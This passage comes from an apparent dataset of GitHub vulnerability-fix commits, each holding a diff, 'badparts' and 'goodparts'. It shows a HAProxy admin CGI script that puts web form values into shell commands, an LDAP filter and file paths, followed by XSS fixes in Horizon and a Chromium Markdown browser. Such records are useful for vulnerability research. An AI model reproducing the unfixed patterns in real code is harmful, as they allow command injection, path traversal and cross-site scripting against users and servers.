hour+':'+minut\n\tdate1 = hour1+':'+minut1\n\t\n\tif grep is not None:\n\t\tgrep_act  = '|grep'\n\telse:\n\t\tgrep_act = ''\n\t\tgrep = ''\n\n\tcmd=\"cat %s| awk '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s  %s %s\" % (log_path + viewlog, date, date1, rows, grep_act, grep)\n\toutput, stderr = funct.subprocess_execute(cmd)\n\n\tfunct.show_log(output)\n\tprint(stderr)\n\t\t\nif serv is not None and act == \"showMap\":\n\tovw.get_map(serv)\n\t\nif form.getvalue('servaction') is not None:\n\tserver_state_file = sql.get_setting('server_state_file')\n\thaproxy_sock = sql.get_setting('haproxy_sock')\n\tenable = form.getvalue('servaction')\n\tbackend = form.getvalue('servbackend')\t\n\tcmd='echo \"%s %s\" |sudo socat stdio %s | cut -d \",\" -f 1-2,5-10,18,34-36 | column -s, -t' % (enable, backend, haproxy_sock)\n\t\n\tif form.getvalue('save') == \"on\":\n\t\tsave_command = 'echo \"show servers state\" | sudo socat stdio %s > %s' % (haproxy_sock, server_state_file)\n\t\tcommand = [ cmd, save_command ] \n\telse:\n\t\tcommand = [ cmd ] \n\t\t\n\tif enable != \"show\":\n\t\tprint('<center><h3>You %s %s on HAproxy %s. <a href=\"viewsttats.py?serv=%s\" title=\"View stat\" target=\"_blank\">Look it</a> or <a href=\"edit.py\" title=\"Edit\">Edit something else</a></h3><br />' % (enable, backend, serv, serv))\n\t\t\t\n\tfunct.ssh_command(serv, command, show_log=\"1\")\n\taction = 'edit.py ' + enable + ' ' + backend\n\tfunct.logging(serv, action)\n\nif act == \"showCompareConfigs\":\n\timport glob\n\tfrom jinja2 import Environment, FileSystemLoader\n\tenv = Environment(loader=FileSystemLoader('templates/ajax'))\n\ttemplate = env.get_template('/show_compare_configs.html')\n\tleft = form.getvalue('left')\n\tright = form.getvalue('right')\n\t\n\ttemplate = template.render(serv=serv, right=right, left=left, return_files=funct.get_files())\t\t\t\t\t\t\t\t\t\n\tprint(template)\n\t\nif serv is not None and form.getvalue('right') is not None:\n\tfrom jinja2 import Environment, FileSystemLoader\n\tleft = form.getvalue('left')\n\tright = form.getvalue('right')\n\thap_configs_dir = funct.get_config_var('configs', 'haproxy_save_configs_dir')\n\tcmd='diff -ub %s%s %s%s' % (hap_configs_dir, left, hap_configs_dir, right)\t\n\tenv = Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols', \"jinja2.ext.do\"])\n\ttemplate = env.get_template('compare.html')\n\t\n\toutput, stderr = funct.subprocess_execute(cmd)\n\ttemplate = template.render(stdout=output)\t\n\t\n\tprint(template)\n\tprint(stderr)\n\t\nif serv is not None and act == \"configShow\":\n\thap_configs_dir = funct.get_config_var('configs', 'haproxy_save_configs_dir')\n\t\n\tif form.getvalue('configver') is None:\t\n\t\tcfg = hap_configs_dir + serv + \"-\" + funct.get_data('config') + \".cfg\"\n\t\tfunct.get_config(serv, cfg)\n\telse: \n\t\tcfg = hap_configs_dir + form.getvalue('configver')\n\t\t\t\n\ttry:\n\t\tconf = open(cfg, \"r\")\n\texcept IOError:\n\t\tprint('<div class=\"alert alert-danger\">Can\\'t read import config file</div>')\n\t\t\n\tfrom jinja2 import Environment, FileSystemLoader\n\tenv = Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols'])\n\ttemplate = env.get_template('config_show.html')\n\t\n\ttemplate = template.render(conf=conf, view=form.getvalue('view'), serv=serv, configver=form.getvalue('configver'), role=funct.is_admin(level=2))\t\t\t\t\t\t\t\t\t\t\t\n\tprint(template)\n\t\n\tif form.getvalue('configver') is None:\n\t\tos.system(\"/bin/rm -f \" + cfg)\t\n\t\t\nif form.getvalue('master'):\n\tmaster = form.getvalue('master')\n\tslave = form.getvalue('slave')\n\tinterface = form.getvalue('interface')\n\tvrrpip = form.getvalue('vrrpip')\n\ttmp_config_path = sql.get_setting('tmp_config_path')\n\tscript = \"install_keepalived.sh\"\n\t\n\tif form.getvalue('hap') == \"1\":\n\t\tfunct.install_haproxy(master)\n\t\tfunct.install_haproxy(slave)\n\t\t\n\tif form.getvalue('syn_flood') == \"1\":\n\t\tfunct.syn_flood_protect(master)\n\t\tfunct.syn_flood_protect(slave)\n\t\n\tos.system(\"cp scripts/%s .\" % script)\n\t\t\n\terror = str(funct.upload(master, tmp_config_path, script))\n\tif error:\n\t\tprint('error: '+error)\n\t\tsys.exit()\n\tfunct.upload(slave, tmp_config_path, script)\n\n\tfunct.ssh_command(master, [\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" MASTER \"+interface+\" \"+vrrpip])\n\tfunct.ssh_command(slave, [\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" BACKUP \"+interface+\" \"+vrrpip])\n\t\t\t\n\tos.system(\"rm -f %s\" % script)\n\tsql.update_server_master(master, slave)\n\t\nif form.getvalue('masteradd'):\n\tmaster = form.getvalue('masteradd')\n\tslave = form.getvalue('slaveadd')\n\tinterface = form.getvalue('interfaceadd')\n\tvrrpip = form.getvalue('vrrpipadd')\n\tkp = form.getvalue('kp')\n\ttmp_config_path = sql.get_setting('tmp_config_path')\n\tscript = \"add_vrrp.sh\"\n\t\n\tos.system(\"cp scripts/%s .\" % script)\n\t\t\n\terror = str(funct.upload(master, tmp_config_path, script))\n\tif error:\n\t\tprint('error: '+error)\n\t\tsys.exit()\n\tfunct.upload(slave, tmp_config_path, script)\n\t\n\tfunct.ssh_command(master, [\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" MASTER \"+interface+\" \"+vrrpip+\" \"+kp])\n\tfunct.ssh_command(slave, [\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" BACKUP \"+interface+\" \"+vrrpip+\" \"+kp])\n\t\t\t\n\tos.system(\"rm -f %s\" % script)\n\t\nif form.getvalue('haproxyaddserv'):\n\tfunct.install_haproxy(form.getvalue('haproxyaddserv'), syn_flood=form.getvalue('syn_flood'))\n\t\nif form.getvalue('installwaf'):\n\tfunct.waf_install(form.getvalue('installwaf'))\n\t\nif form.getvalue('metrics_waf'):\n\tsql.update_waf_metrics_enable(form.getvalue('metrics_waf'), form.getvalue('enable'))\n\t\t\nif form.getvalue('table_metrics'):\n\timport http.cookies\n\tfrom jinja2 import Environment, FileSystemLoader\n\tenv = Environment(loader=FileSystemLoader('templates/ajax'))\n\ttemplate = env.get_template('table_metrics.html')\n\t\t\n\tcookie = http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\"))\n\tuser_id = cookie.get('uuid')\t\n\ttable_stat = sql.select_table_metrics(user_id.value)\n\n\ttemplate = template.render(table_stat=sql.select_table_metrics(user_id.value))\t\t\t\t\t\t\t\t\t\t\t\n\tprint(template)\n\t\t\nif form.getvalue('metrics'):\n\tfrom datetime import timedelta\n\tfrom bokeh.plotting import figure, output_file, show\n\tfrom bokeh.models import ColumnDataSource, HoverTool, DatetimeTickFormatter, DatePicker\n\tfrom bokeh.layouts import widgetbox, gridplot\n\tfrom bokeh.models.widgets import Button, RadioButtonGroup, Select\n\timport pandas as pd\n\timport http.cookies\n\t\t\n\tcookie = http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\"))\n\tuser_id = cookie.get('uuid')\t\n\tservers = sql.select_servers_metrics(user_id.value)\n\tservers = sorted(servers)\n\t\n\tp = {}\n\tfor serv in servers:\n\t\tserv = serv[0]\n\t\tp[serv] = {}\n\t\tmetric = sql.select_metrics(serv)\n\t\tmetrics = {}\n\t\t\n\t\tfor i in metric:\n\t\t\trep_date = str(i[5])\n\t\t\tmetrics[rep_date] = {}\n\t\t\tmetrics[rep_date]['server'] = str(i[0])\n\t\t\tmetrics[rep_date]['curr_con'] = str(i[1])\n\t\t\tmetrics[rep_date]['curr_ssl_con'] = str(i[2])\n\t\t\tmetrics[rep_date]['sess_rate'] = str(i[3])\n\t\t\tmetrics[rep_date]['max_sess_rate'] = str(i[4])\n\n\t\tdf = pd.DataFrame.from_dict(metrics, orient=\"index\")\n\t\tdf = df.fillna(0)\n\t\tdf.index = pd.to_datetime(df.index)\n\t\tdf.index.name = 'Date'\n\t\tdf.sort_index(inplace=True)\n\t\tsource = ColumnDataSource(df)\n\t\t\n\t\toutput_file(\"templates/metrics_out.html\", mode='inline')\n\t\t\n\t\tx_min = df.index.min() - pd.Timedelta(hours=1)\n\t\tx_max = df.index.max() + pd.Timedelta(minutes=1)\n\n\t\tp[serv] = figure(\n\t\t\ttools=\"pan,box_zoom,reset,xwheel_zoom\",\t\t\n\t\t\ttitle=metric[0][0],\n\t\t\tx_axis_type=\"datetime\", y_axis_label='Connections',\n\t\t\tx_range = (x_max.timestamp()*1000-60*100000, x_max.timestamp()*1000)\n\t\t\t)\n\t\t\t\n\t\thover = HoverTool(\n\t\t\ttooltips=[\n\t\t\t\t(\"Connections\", \"@curr_con\"),\n\t\t\t\t(\"SSL connections\", \"@curr_ssl_con\"),\n\t\t\t\t(\"Sessions rate\", \"@sess_rate\")\n\t\t\t],\n\t\t\tmode='mouse'\n\t\t)\n\t\t\n\t\tp[serv].ygrid.band_fill_color = \"#f3f8fb\"\n\t\tp[serv].ygrid.band_fill_alpha = 0.9\n\t\tp[serv].y_range.start = 0\n\t\tp[serv].y_range.end = int(df['curr_con'].max()) + 150\n\t\tp[serv].add_tools(hover)\n\t\tp[serv].title.text_font_size = \"20px\"\t\t\t\t\t\t\n\t\tp[serv].line(\"Date\", \"curr_con\", source=source, alpha=0.5, color='#5cb85c', line_width=2, legend=\"Conn\")\n\t\tp[serv].line(\"Date\", \"curr_ssl_con\", source=source, alpha=0.5, color=\"#5d9ceb\", line_width=2, legend=\"SSL con\")\n\t\tp[serv].line(\"Date\", \"sess_rate\", source=source, alpha=0.5, color=\"#33414e\", line_width=2, legend=\"Sessions\")\n\t\tp[serv].legend.orientation = \"horizontal\"\n\t\tp[serv].legend.location = \"top_left\"\n\t\tp[serv].legend.padding = 5\n\n\tplots = []\n\tfor key, value in p.items():\n\t\tplots.append(value)\n\t\t\n\tgrid = gridplot(plots, ncols=2, plot_width=800, plot_height=250, toolbar_location = \"left\", toolbar_options=dict(logo=None))\n\tshow(grid)\n\t\nif form.getvalue('waf_metrics'):\n\tfrom datetime import timedelta\n\tfrom bokeh.plotting import figure, output_file, show\n\tfrom bokeh.models import ColumnDataSource, HoverTool, DatetimeTickFormatter, DatePicker\n\tfrom bokeh.layouts import widgetbox, gridplot\n\tfrom bokeh.models.widgets import Button, RadioButtonGroup, Select\n\timport pandas as pd\n\timport http.cookies\n\t\t\n\tcookie = http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\"))\n\tuser_id = cookie.get('uuid')\t\n\tservers = sql.select_waf_servers_metrics(user_id.value)\n\tservers = sorted(servers)\n\t\n\tp = {}\n\tfor serv in servers:\n\t\tserv = serv[0]\n\t\tp[serv] = {}\n\t\tmetric = sql.select_waf_metrics(serv)\n\t\tmetrics = {}\n\t\t\n\t\tfor i in metric:\n\t\t\trep_date = str(i[2])\n\t\t\tmetrics[rep_date] = {}\n\t\t\tmetrics[rep_date]['conn'] = str(i[1])\n\n\t\tdf = pd.DataFrame.from_dict(metrics, orient=\"index\")\n\t\tdf = df.fillna(0)\n\t\tdf.index = pd.to_datetime(df.index)\n\t\tdf.index.name = 'Date'\n\t\tdf.sort_index(inplace=True)\n\t\tsource = ColumnDataSource(df)\n\t\t\n\t\toutput_file(\"templates/metrics_waf_out.html\", mode='inline')\n\t\t\n\t\tx_min = df.index.min() - pd.Timedelta(hours=1)\n\t\tx_max = df.index.max() + pd.Timedelta(minutes=1)\n\n\t\tp[serv] = figure(\n\t\t\ttools=\"pan,box_zoom,reset,xwheel_zoom\",\n\t\t\ttitle=metric[0][0],\n\t\t\tx_axis_type=\"datetime\", y_axis_label='Connections',\n\t\t\tx_range = (x_max.timestamp()*1000-60*100000, x_max.timestamp()*1000)\n\t\t\t)\n\t\t\t\n\t\thover = HoverTool(\n\t\t\ttooltips=[\n\t\t\t\t(\"Connections\", \"@conn\"),\n\t\t\t],\n\t\t\tmode='mouse'\n\t\t)\n\t\t\n\t\tp[serv].ygrid.band_fill_color = \"#f3f8fb\"\n\t\tp[serv].ygrid.band_fill_alpha = 0.9\n\t\tp[serv].y_range.start = 0\n\t\tp[serv].y_range.end = int(df['conn'].max()) + 150\n\t\tp[serv].add_tools(hover)\n\t\tp[serv].title.text_font_size = \"20px\"\t\t\t\t\n\t\tp[serv].line(\"Date\", \"conn\", source=source, alpha=0.5, color='#5cb85c', line_width=2, legend=\"Conn\")\n\t\tp[serv].legend.orientation = \"horizontal\"\n\t\tp[serv].legend.location = \"top_left\"\n\t\tp[serv].legend.padding = 5\n\t\t\n\tplots = []\n\tfor key, value in p.items():\n\t\tplots.append(value)\n\t\t\n\tgrid = gridplot(plots, ncols=2, plot_width=800, plot_height=250, toolbar_location = \"left\", toolbar_options=dict(logo=None))\n\tshow(grid)\n\t\nif form.getvalue('get_hap_v'):\n\toutput = funct.check_haproxy_version(serv)\n\tprint(output)\n\t\nif form.getvalue('bwlists'):\n\tlist = os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color')+\"/\"+form.getvalue('bwlists')\n\ttry:\n\t\tfile = open(list, \"r\")\n\t\tfile_read = file.read()\n\t\tfile.close\n\t\tprint(file_read)\n\texcept IOError:\n\t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n read '+form.getvalue('color')+' list</div>')\n\t\t\nif form.getvalue('bwlists_create'):\n\tlist_name = form.getvalue('bwlists_create').split('.')[0]\n\tlist_name += '.lst'\n\tlist = os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color')+\"/\"+list_name\n\ttry:\n\t\topen(list, 'a').close()\n\t\tprint('<div class=\"alert alert-success\" style=\"margin:0\">'+form.getvalue('color')+' list was created</div>')\n\texcept IOError as e:\n\t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n create new '+form.getvalue('color')+' list. %s </div>' % e)\n\t\t\nif form.getvalue('bwlists_save'):\n\tlist = os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color')+\"/\"+form.getvalue('bwlists_save')\n\ttry:\n\t\twith open(list, \"w\") as file:\n\t\t\tfile.write(form.getvalue('bwlists_content'))\n\texcept IOError as e:\n\t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n save '+form.getvalue('color')+' list. %s </div>' % e)\n\t\n\tservers = sql.get_dick_permit()\n\tpath = sql.get_setting('haproxy_dir')+\"/\"+form.getvalue('color')\n\t\n\tfor server in servers:\n\t\tfunct.ssh_command(server[2], [\"sudo mkdir \"+path])\n\t\terror = funct.upload(server[2], path+\"/\"+form.getvalue('bwlists_save'), list, dir='fullpath')\n\t\tif error:\n\t\t\tprint('<div class=\"alert alert-danger\">Upload fail: %s</div>' % error)\t\t\t\n\t\telse:\n\t\t\tprint('<div class=\"alert alert-success\" style=\"margin:10px\">Edited '+form.getvalue('color')+' list was uploaded to '+server[1]+'</div>')\n\t\t\tif form.getvalue('bwlists_restart') == 'restart':\n\t\t\t\tfunct.ssh_command(server[2], [\"sudo \" + sql.get_setting('restart_command')])\n\t\t\t\nif form.getvalue('get_lists'):\n\tlist = os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color')\n\tlists = funct.get_files(dir=list, format=\"lst\")\n\tfor list in lists:\n\t\tprint(list)\n\t\t\nif form.getvalue('get_ldap_email'):\n\tusername = form.getvalue('get_ldap_email')\n\timport ldap\n\t\n\tserver = sql.get_setting('ldap_server')\n\tport = sql.get_setting('ldap_port')\n\tuser = sql.get_setting('ldap_user')\n\tpassword = sql.get_setting('ldap_password')\n\tldap_base = sql.get_setting('ldap_base')\n\tdomain = sql.get_setting('ldap_domain')\n\tldap_search_field = sql.get_setting('ldap_search_field')\n\n\tl = ldap.initialize(\"ldap://\"+server+':'+port)\n\ttry:\n\t\tl.protocol_version = ldap.VERSION3\n\t\tl.set_option(ldap.OPT_REFERRALS, 0)\n\n\t\tbind = l.simple_bind_s(user, password)\n\n\t\tcriteria = \"(&(objectClass=user)(sAMAccountName=\"+username+\"))\"\n\t\tattributes = [ldap_search_field]\n\t\tresult = l.search_s(ldap_base, ldap.SCOPE_SUBTREE, criteria, attributes)\n\n\t\tresults = [entry for dn, entry in result if isinstance(entry, dict)]\n\t\ttry:\n\t\t\tprint('[\"'+results[0][ldap_search_field][0].decode(\"utf-8\")+'\",\"'+domain+'\"]')\n\t\texcept:\n\t\t\tprint('error: user not found')\n\tfinally:\n\t\tl.unbind()"
                }
            },
            "msg": "v3.4.4.5\n\nXSS protect"
        }
    },
    "https://github.com/AMfalme/Horizon_Openstack": {
        "a835dbfbaa2c70329c08d4b8429d49315dc6d651": {
            "url": "https://api.github.com/repos/AMfalme/Horizon_Openstack/commits/a835dbfbaa2c70329c08d4b8429d49315dc6d651",
            "html_url": "https://github.com/AMfalme/Horizon_Openstack/commit/a835dbfbaa2c70329c08d4b8429d49315dc6d651",
            "sha": "a835dbfbaa2c70329c08d4b8429d49315dc6d651",
            "keyword": "XSS correct",
            "diff": "diff --git a/openstack_dashboard/dashboards/identity/mappings/tables.py b/openstack_dashboard/dashboards/identity/mappings/tables.py\nindex df6e8f307..9c22285d6 100644\n--- a/openstack_dashboard/dashboards/identity/mappings/tables.py\n+++ b/openstack_dashboard/dashboards/identity/mappings/tables.py\n@@ -14,7 +14,6 @@\n \n import json\n \n-from django.utils import safestring\n from django.utils.translation import ugettext_lazy as _\n from django.utils.translation import ungettext_lazy\n \n@@ -75,7 +74,7 @@ def get_rules_as_json(mapping):\n     rules = getattr(mapping, 'rules', None)\n     if rules:\n         rules = json.dumps(rules, indent=4)\n-    return safestring.mark_safe(rules)\n+    return rules\n \n \n class MappingsTable(tables.DataTable):\n",
            "message": "",
            "files": {
                "/openstack_dashboard/dashboards/identity/mappings/tables.py": {
                    "changes": [
                        {
                            "diff": "\n \n import json\n \n-from django.utils import safestring\n from django.utils.translation import ugettext_lazy as _\n from django.utils.translation import ungettext_lazy\n \n",
                            "add": 0,
                            "remove": 1,
                            "filename": "/openstack_dashboard/dashboards/identity/mappings/tables.py",
                            "badparts": [
                                "from django.utils import safestring"
                            ],
                            "goodparts": []
                        },
                        {
                            "diff": "\n     rules = getattr(mapping, 'rules', None)\n     if rules:\n         rules = json.dumps(rules, indent=4)\n-    return safestring.mark_safe(rules)\n+    return rules\n \n \n class MappingsTable(tables.DataTable):\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/openstack_dashboard/dashboards/identity/mappings/tables.py",
                            "badparts": [
                                "    return safestring.mark_safe(rules)"
                            ],
                            "goodparts": [
                                "    return rules"
                            ]
                        }
                    ],
                    "source": "\n import json from django.utils import safestring from django.utils.translation import ugettext_lazy as _ from django.utils.translation import ungettext_lazy from horizon import tables from openstack_dashboard import api class CreateMappingLink(tables.LinkAction): name=\"create\" verbose_name=_(\"Create Mapping\") url=\"horizon:identity:mappings:create\" classes=(\"ajax-modal\",) icon=\"plus\" policy_rules=((\"identity\", \"identity:create_mapping\"),) class EditMappingLink(tables.LinkAction): name=\"edit\" verbose_name=_(\"Edit\") url=\"horizon:identity:mappings:update\" classes=(\"ajax-modal\",) icon=\"pencil\" policy_rules=((\"identity\", \"identity:update_mapping\"),) class DeleteMappingsAction(tables.DeleteAction): @staticmethod def action_present(count): return ungettext_lazy( u\"Delete Mapping\", u\"Delete Mappings\", count ) @staticmethod def action_past(count): return ungettext_lazy( u\"Deleted Mapping\", u\"Deleted Mappings\", count ) policy_rules=((\"identity\", \"identity:delete_mapping\"),) def delete(self, request, obj_id): api.keystone.mapping_delete(request, obj_id) class MappingFilterAction(tables.FilterAction): def filter(self, table, mappings, filter_string): \"\"\"Naive case-insensitive search.\"\"\" q=filter_string.lower() return[mapping for mapping in mappings if q in mapping.ud.lower()] def get_rules_as_json(mapping): rules=getattr(mapping, 'rules', None) if rules: rules=json.dumps(rules, indent=4) return safestring.mark_safe(rules) class MappingsTable(tables.DataTable): id=tables.Column('id', verbose_name=_('Mapping ID')) description=tables.Column(get_rules_as_json, verbose_name=_('Rules')) class Meta(object): name=\"idp_mappings\" verbose_name=_(\"Attribute Mappings\") row_actions=(EditMappingLink, DeleteMappingsAction) table_actions=(MappingFilterAction, CreateMappingLink, DeleteMappingsAction) ",
                    "sourceWithComments": "# Copyright (C) 2015 Yahoo! Inc. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n# not use this file except in compliance with the License. You may obtain\n# a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n# License for the specific language governing permissions and limitations\n# under the License.\n\nimport json\n\nfrom django.utils import safestring\nfrom django.utils.translation import ugettext_lazy as _\nfrom django.utils.translation import ungettext_lazy\n\nfrom horizon import tables\n\nfrom openstack_dashboard import api\n\n\nclass CreateMappingLink(tables.LinkAction):\n    name = \"create\"\n    verbose_name = _(\"Create Mapping\")\n    url = \"horizon:identity:mappings:create\"\n    classes = (\"ajax-modal\",)\n    icon = \"plus\"\n    policy_rules = ((\"identity\", \"identity:create_mapping\"),)\n\n\nclass EditMappingLink(tables.LinkAction):\n    name = \"edit\"\n    verbose_name = _(\"Edit\")\n    url = \"horizon:identity:mappings:update\"\n    classes = (\"ajax-modal\",)\n    icon = \"pencil\"\n    policy_rules = ((\"identity\", \"identity:update_mapping\"),)\n\n\nclass DeleteMappingsAction(tables.DeleteAction):\n    @staticmethod\n    def action_present(count):\n        return ungettext_lazy(\n            u\"Delete Mapping\",\n            u\"Delete Mappings\",\n            count\n        )\n\n    @staticmethod\n    def action_past(count):\n        return ungettext_lazy(\n            u\"Deleted Mapping\",\n            u\"Deleted Mappings\",\n            count\n        )\n    policy_rules = ((\"identity\", \"identity:delete_mapping\"),)\n\n    def delete(self, request, obj_id):\n        api.keystone.mapping_delete(request, obj_id)\n\n\nclass MappingFilterAction(tables.FilterAction):\n    def filter(self, table, mappings, filter_string):\n        \"\"\"Naive case-insensitive search.\"\"\"\n        q = filter_string.lower()\n        return [mapping for mapping in mappings\n                if q in mapping.ud.lower()]\n\n\ndef get_rules_as_json(mapping):\n    rules = getattr(mapping, 'rules', None)\n    if rules:\n        rules = json.dumps(rules, indent=4)\n    return safestring.mark_safe(rules)\n\n\nclass MappingsTable(tables.DataTable):\n    id = tables.Column('id', verbose_name=_('Mapping ID'))\n    description = tables.Column(get_rules_as_json,\n                                verbose_name=_('Rules'))\n\n    class Meta(object):\n        name = \"idp_mappings\"\n        verbose_name = _(\"Attribute Mappings\")\n        row_actions = (EditMappingLink, DeleteMappingsAction)\n        table_actions = (MappingFilterAction, CreateMappingLink,\n                         DeleteMappingsAction)\n"
                }
            },
            "msg": "Remove dangerous safestring declaration\n\nThis declaration allows XSS content through the JSON and\nis unnecessary for correct rendering of the content anyway.\n\nChange-Id: I82355b37108609ae573237424e528aab86a24efc\nCloses-Bug: 1667086"
        }
    },
    "https://github.com/cjbd/src": {
        "e11db126ab1874bd2442e60f18d34c10f3697742": {
            "url": "https://api.github.com/repos/cjbd/src/commits/e11db126ab1874bd2442e60f18d34c10f3697742",
            "html_url": "https://github.com/cjbd/src/commit/e11db126ab1874bd2442e60f18d34c10f3697742",
            "sha": "e11db126ab1874bd2442e60f18d34c10f3697742",
            "keyword": "XSS correct",
            "diff": "diff --git a/tools/md_browser/md_browser.py b/tools/md_browser/md_browser.py\nindex 5062ab345fd6..e24e29ffe434 100755\n--- a/tools/md_browser/md_browser.py\n+++ b/tools/md_browser/md_browser.py\n@@ -9,6 +9,7 @@\n import SimpleHTTPServer\n import SocketServer\n import argparse\n+import cgi\n import codecs\n import os\n import re\n@@ -16,6 +17,7 @@\n import sys\n import threading\n import time\n+import urllib\n import webbrowser\n from xml.etree import ElementTree\n \n@@ -124,6 +126,7 @@ def server_bind(self):\n \n class Handler(SimpleHTTPServer.SimpleHTTPRequestHandler):\n   def do_GET(self):\n+    self.path = urllib.unquote(self.path)\n     path = self.path\n \n     # strip off the repo and branch info, if present, for compatibility\n@@ -226,12 +229,13 @@ def _DoCSS(self, template):\n \n   def _DoNotFound(self):\n     self._WriteHeader('text/html', status_code=404)\n-    self.wfile.write('<html><body>%s not found</body></html>' % self.path)\n+    self.wfile.write(\n+        '<html><body>%s not found</body></html>' % cgi.escape(self.path))\n \n   def _DoUnknown(self):\n     self._WriteHeader('text/html', status_code=501)\n     self.wfile.write('<html><body>I do not know how to serve %s.</body>'\n-                       '</html>' % self.path)\n+                     '</html>' % cgi.escape(self.path))\n \n   def _DoDirListing(self, full_path):\n     self._WriteHeader('text/html')\n@@ -239,27 +243,32 @@ def _DoDirListing(self, full_path):\n     self.wfile.write('<div class=\"doc\">')\n \n     self.wfile.write('<div class=\"Breadcrumbs\">\\n')\n-    self.wfile.write('<a class=\"Breadcrumbs-crumb\">%s</a>\\n' % self.path)\n+    self.wfile.write(\n+        '<a class=\"Breadcrumbs-crumb\">%s</a>\\n' % cgi.escape(self.path))\n     self.wfile.write('</div>\\n')\n \n+    escaped_dir = cgi.escape(self.path.rstrip('/'), quote=True)\n+\n     for _, dirs, files in os.walk(full_path):\n       for f in sorted(files):\n         if f.startswith('.'):\n           continue\n+        f = cgi.escape(f, quote=True)\n         if f.endswith('.md'):\n           bold = ('<b>', '</b>')\n         else:\n           bold = ('', '')\n         self.wfile.write('<a href=\"%s/%s\">%s%s%s</a><br/>\\n' %\n-                         (self.path.rstrip('/'), f, bold[0], f, bold[1]))\n+                         (escaped_dir, f, bold[0], f, bold[1]))\n \n       self.wfile.write('<br/>\\n')\n \n       for d in sorted(dirs):\n         if d.startswith('.'):\n           continue\n+        d = cgi.escape(d, quote=True)\n         self.wfile.write('<a href=\"%s/%s\">%s/</a><br/>\\n' %\n-                         (self.path.rstrip('/'), d, d))\n+                         (escaped_dir, d, d))\n \n       break\n \n",
            "message": "",
            "files": {
                "/tools/md_browser/md_browser.py": {
                    "changes": [
                        {
                            "diff": "\n     self.wfile.write('<div class=\"doc\">')\n \n     self.wfile.write('<div class=\"Breadcrumbs\">\\n')\n-    self.wfile.write('<a class=\"Breadcrumbs-crumb\">%s</a>\\n' % self.path)\n+    self.wfile.write(\n+        '<a class=\"Breadcrumbs-crumb\">%s</a>\\n' % cgi.escape(self.path))\n     self.wfile.write('</div>\\n')\n \n+    escaped_dir = cgi.escape(self.path.rstrip('/'), quote=True)\n+\n     for _, dirs, files in os.walk(full_path):\n       for f in sorted(files):\n         if f.startswith('.'):\n           continue\n+        f = cgi.escape(f, quote=True)\n         if f.endswith('.md'):\n           bold = ('<b>', '</b>')\n         else:\n           bold = ('', '')\n         self.wfile.write('<a href=\"%s/%s\">%s%s%s</a><br/>\\n' %\n-                         (self.path.rstrip('/'), f, bold[0], f, bold[1]))\n+                         (escaped_dir, f, bold[0], f, bold[1]))\n \n       self.wfile.write('<br/>\\n')\n \n       for d in sorted(dirs):\n         if d.startswith('.'):\n           continue\n+        d = cgi.escape(d, quote=True)\n         self.wfile.write('<a href=\"%s/%s\">%s/</a><br/>\\n' %\n-                         (self.path.rstrip('/'), d, d))\n+                         (escaped_dir, d, d))\n \n       break\n \n",
                            "add": 8,
                            "remove": 3,
                            "filename": "/tools/md_browser/md_browser.py",
                            "badparts": [
                                "    self.wfile.write('<a class=\"Breadcrumbs-crumb\">%s</a>\\n' % self.path)",
                                "                         (self.path.rstrip('/'), f, bold[0], f, bold[1]))",
                                "                         (self.path.rstrip('/'), d, d))"
                            ],
                            "goodparts": [
                                "    self.wfile.write(",
                                "        '<a class=\"Breadcrumbs-crumb\">%s</a>\\n' % cgi.escape(self.path))",
                                "    escaped_dir = cgi.escape(self.path.rstrip('/'), quote=True)",
                                "        f = cgi.escape(f, quote=True)",
                                "                         (escaped_dir, f, bold[0], f, bold[1]))",
                                "        d = cgi.escape(d, quote=True)",
                                "                         (escaped_dir, d, d))"
                            ]
                        }
                    ],
                    "source": "\n \"\"\"Simple Markdown browser for a Git checkout.\"\"\" from __future__ import print_function import SimpleHTTPServer import SocketServer import argparse import codecs import os import re import socket import sys import threading import time import webbrowser from xml.etree import ElementTree THIS_DIR=os.path.realpath(os.path.dirname(__file__)) SRC_DIR=os.path.dirname(os.path.dirname(THIS_DIR)) sys.path.insert(0, os.path.join(SRC_DIR, 'third_party', 'Python-Markdown')) import markdown def main(argv): parser=argparse.ArgumentParser(prog='md_browser') parser.add_argument('-p', '--port', type=int, default=8080, help='port to run on(default=%(default)s)') parser.add_argument('-d', '--directory', type=str, default=SRC_DIR) parser.add_argument('-e', '--external', action='store_true', help='whether to bind to external port') parser.add_argument('file', nargs='?', help='open file in browser') args=parser.parse_args(argv) top_level=os.path.realpath(args.directory) hostname='0.0.0.0' if args.external else 'localhost' server_address=(hostname, args.port) s=Server(server_address, top_level) origin='http://' +hostname if args.port !=80: origin +=':%s' % args.port print('Listening on %s/' % origin) thread=None if args.file: path=os.path.realpath(args.file) if not path.startswith(top_level): print('%s is not under %s' %(args.file, args.directory)) return 1 rpath=os.path.relpath(path, top_level) url='%s/%s' %(origin, rpath) print('Opening %s' % url) thread=threading.Thread(target=_open_url, args=(url,)) thread.start() elif os.path.isfile(os.path.join(top_level, 'docs', 'README.md')): print(' 